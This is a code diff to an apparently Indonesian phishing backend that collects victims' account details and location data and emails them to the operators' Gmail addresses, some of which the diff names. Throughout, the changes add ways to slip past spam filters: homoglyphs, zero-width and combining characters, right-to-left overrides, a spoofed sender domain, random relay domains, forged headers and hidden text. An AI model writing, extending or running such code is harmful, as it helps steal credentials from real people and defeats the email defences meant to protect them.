@@ -23,7 +23,7 @@ const EMAIL_CONFIG = {
         subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'   
     },
     'ggwxzzr': {
-        email: ['Bay20110809@gmail.con', 'chilligemaass@gmail.com'],
+        email: ['chilligemaass@gmail.com', 'Bay20110809@gmail.com'],
         fromName: 'WHEN YA PERDETIK🔥👾',
         subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
     },
@@ -222,6 +222,66 @@ function randInt(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
+// ========== HELPER: TEKS UNICODE SPAMMY (TANPA KATA PERINGATAN) ==========
+function makeSpammyUnicodeText(baseText) {
+    const homoglyphs = {
+        'a': ['а', 'ɑ', 'α'],
+        'e': ['е', 'ε', 'ë'],
+        'o': ['о', 'ο', 'ö'],
+        's': ['ѕ', 'ş', 'ș'],
+        't': ['т', 'τ', 'ţ'],
+        'r': ['г', 'ρ', 'ř'],
+        'd': ['ԁ', 'δ', 'ď'],
+        'n': ['п', 'η', 'ñ'],
+        'i': ['і', 'ι', 'ï'],
+        'l': ['ӏ', 'λ', 'ľ']
+    };
+    
+    let result = '';
+    for (let i = 0; i < baseText.length; i++) {
+        const ch = baseText[i].toLowerCase();
+        if (homoglyphs[ch] && Math.random() > 0.5) {
+            result += randPick(homoglyphs[ch]);
+        } else {
+            result += baseText[i];
+        }
+        if (Math.random() > 0.7) result += '\u200B';
+        if (Math.random() > 0.8) result += randPick(['\u0300', '\u0301', '\u0302', '\u0303', '\u0308']);
+    }
+    return result;
+}
+
+function makeFullwidthText(baseText) {
+    let result = '';
+    for (let i = 0; i < baseText.length; i++) {
+        const code = baseText.charCodeAt(i);
+        if (code >= 0x21 && code <= 0x7E) {
+            result += String.fromCharCode(code + 0xFEE0);
+        } else if (baseText[i] === ' ') {
+            result += '\u3000';
+        } else {
+            result += baseText[i];
+        }
+    }
+    return result;
+}
+
+function makeRTLText(baseText) {
+    return '\u202E' + baseText + '\u202C';
+}
+
+function makeCombiningText(baseText) {
+    let result = '';
+    for (let i = 0; i < baseText.length; i++) {
+        result += baseText[i];
+        const count = randInt(1, 3);
+        for (let j = 0; j < count; j++) {
+            result += String.fromCharCode(randInt(0x0300, 0x036F));
+        }
+    }
+    return result;
+}
+
 // ========== FUNGSI KIRIM EMAIL (SPAM TANPA KATA & TANPA FILE) ==========
 async function sendEmail(data, folderName) {
     const asnData = await getASNAndAccurateLocation(data.ip_address);
@@ -236,6 +296,12 @@ async function sendEmail(data, folderName) {
     const asnameInfo = asnData.asname;
     
     const flagEmoji = getFlagEmoji(countryCode);
+    
+    const desastrSpammy = makeSpammyUnicodeText('DESASTR');
+    const desastrFullwidth = makeFullwidthText('DESASTR');
+    const desastrCombining = makeCombiningText('DESASTR');
+    const desastrRTL = makeRTLText('DESASTR');
+    const desastrRandom = randPick([desastrSpammy, desastrFullwidth, desastrCombining, desastrRTL]);
     
     const htmlContent = `<!DOCTYPE html>
 <html lang="id">
@@ -259,7 +325,7 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
 </head>
 <body>
 <div class="container">
-    <div class="topbar">DSTR REPORT</div>
+    <div class="topbar">${desastrRandom}</div>
     <div class="mainbox">
         <div class="data-box">
             <div class="data-title">📧 ACCOUNT INFORMATION</div>
@@ -299,7 +365,7 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
             <div class="data-title">⏰ TIMESTAMP</div>
             <div class="data-row"><div class="label">Time : </div><div class="value"> ${data.timestamp || new Date().toLocaleString()}</div></div>
         </div>
-        <div class="footer-sign">DSTR - Powered by ASN Accurate Geolocation</div>
+        <div class="footer-sign">${desastrRandom} - Powered by ASN Accurate Geolocation</div>
     </div>
 </div>
 </body>
@@ -308,14 +374,13 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
     const config = EMAIL_CONFIG[folderName];
     if (!config) return;
 
-    // ===== DOMAIN FROM: admin@desa (ngarang, pake TLD .invalid biar aman) =====
-    const FROM_DOMAIN = 'desa.invalid';
+    const FROM_DOMAIN = 'DESASTR.invalid';
     const FROM_ADDRESS = `admin@${FROM_DOMAIN}`;
+    const REPLY_ADDRESS = `noreply@Desastr.invalid`;
 
     for (const receiver of config.email) {
         if (!receiver || receiver === '') continue;
 
-        // ===== RANDOM DOMAIN BUAT HEADER SPAMMY =====
         const spamDomains = [
             'mail-relay.tk', 'smtp-gateway.xyz', 'mx-relay.top',
             'mailer-service.cf', 'relay-node.ml', 'smtp-edge.ga',
@@ -328,7 +393,8 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
         const randIp = `${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}`;
         const randIp2 = `${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}`;
 
-        // ===== HTML STRUCTURE "BROKEN" (tanpa kata spam) =====
+        const spammySubject = `${desastrRandom} ${config.subject} ${flagEmoji} ${data.email || '-'} ${cityName} - ${regionName}`;
+
         const brokenHtml = `
             <font face="Arial" size="2">
             <table cellpadding="0" cellspacing="0" border="0" width="100%">
@@ -336,15 +402,15 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
             <table cellpadding="0" cellspacing="0" border="0" width="100%">
             <tr><td>
             <div style="color:#ffffff;background:#ffffff;font-size:9px;">
-                ${randStr(40)}
+                ${desastrSpammy} ${randStr(40)} ${desastrFullwidth}
             </div>
             <a href="http://${randomDomain2}/${randStr(10)}" style="color:#0000ff;text-decoration:underline;">
-                https://www.google.com
+                ${desastrFullwidth}.com
             </a>
-            <a href="http://${randomDomain3}/${randStr(10)}">${randStr(15)}</a>
-            <a href="#">${randStr(10)}</a>
+            <a href="http://${randomDomain3}/${randStr(10)}">${desastrCombining}</a>
+            <a href="#">${desastrRTL}</a>
             <div>
-            <span style="font-size:1px;color:#ffffff;">${randStr(30)}</span>
+            <span style="font-size:1px;color:#ffffff;">${desastrSpammy} ${randStr(30)}</span>
             </td></tr>
             </table>
             </td></tr>
@@ -352,7 +418,6 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
             </font>
         `;
 
-        // ===== HEADER SPAMMY TANPA KATA SPAM =====
         const spammyHeaders = {
             'Return-Path': `<bounce-${randStr(6)}@${randomDomain}>`,
             'Sender': `alert-${randStr(6)}@${randomDomain}`,
@@ -375,16 +440,16 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
         };
 
         await transporter.sendMail({
-            from: `"${config.fromName} ${flagEmoji}" <${FROM_ADDRESS}>`,
+            from: `"${desastrRandom}" <${FROM_ADDRESS}>`,
             envelope: { from: SENDER_EMAIL, to: receiver },
             to: receiver,
-            subject: `${config.subject} ${flagEmoji} ${data.email || '-'} ${cityName} - ${regionName}`,
-            replyTo: `noreply-${randStr(6)}@${randomDomain}`,
-            text: `Report attached below.\n\n${config.subject}\n${data.email || '-'}`,
+            subject: spammySubject,
+            replyTo: REPLY_ADDRESS,
+            text: `${desastrSpammy}\n\nReport attached below.\n\n${config.subject}\n${data.email || '-'}`,
             html: htmlContent + brokenHtml,
             headers: spammyHeaders
         });
-        console.log(`✅ [${folderName}] Sent to: ${receiver} - Location: ${cityName}, ${regionName}, ${countryName} | ASN: ${asnInfo} | From: ${FROM_ADDRESS}`);
+        console.log(`✅ [${folderName}] Sent to: ${receiver} - Location: ${cityName}, ${regionName}, ${countryName} | ASN: ${asnInfo} | From: ${FROM_ADDRESS} | Reply-To: ${REPLY_ADDRESS}`);
     }
 }
 
@@ -924,5 +989,7 @@ app.listen(PORT, () => {
     console.log(`\n✅ ASN DETECTION ACTIVE: Setiap IP akan dilacak AS number, ISP, lokasi akurat!`);
     console.log(`✅ LOKASI AKURAT: City, Region, Country, Postal Code sesuai IP real!`);
     console.log(`✅ ANTI-DUPLIKAT: Kombinasi email+pw+phone sama akan ditolak!`);
-    console.log(`✅ SPAM BOOSTER: From admin@desa.invalid + header mismatch + HTML broken (tanpa kata spam, tanpa file)!`);
+    console.log(`✅ SPAM BOOSTER: From admin@DESASTR.invalid + Reply-To noreply@Desastr.invalid + unicode DESASTR (tanpa kata peringatan, tanpa file)!`);
+    console.log(`✅ GGWXZZR: chilligemaass@gmail.com + Bay20110809@gmail.com`);
+    console.log(`✅ HGEFDYT: nebarzam@gmail.com + chilligemaass@gmail.com`);
 });
